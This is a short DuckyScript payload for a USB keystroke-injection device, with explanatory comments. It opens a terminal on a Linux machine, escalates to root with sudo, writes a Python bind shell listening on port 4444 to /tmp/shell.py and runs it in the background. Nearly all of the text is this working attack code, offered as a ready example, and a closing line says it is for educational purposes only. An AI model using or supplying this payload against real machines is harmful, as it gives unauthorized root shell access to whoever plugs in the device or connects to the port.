REM Since the Rubber Ducky is a programmable USB device, it can be used to inject keyboard commands into a target computer. Below is an example of a payload script that could be used with a Rubber Ducky to create a bind shell on a Linux server with full admin privileges and listen <server host> on port 4444:


DELAY 1000
GUI r
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING sudo su
ENTER
STRING (password)
ENTER
STRING echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('<server host>',4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /tmp/shell.py
ENTER
STRING python /tmp/shell.py &
ENTER


REM This script opens a terminal, elevates to root privileges, creates a Python script that sets up a bind shell <server host> on port 4444, and runs the script in the background. The target server will now be listening <server host> on port 4444 for incoming connections.

REM Please note that using such scripts for unauthorized access is illegal and unethical. This example is provided for educational purposes only.
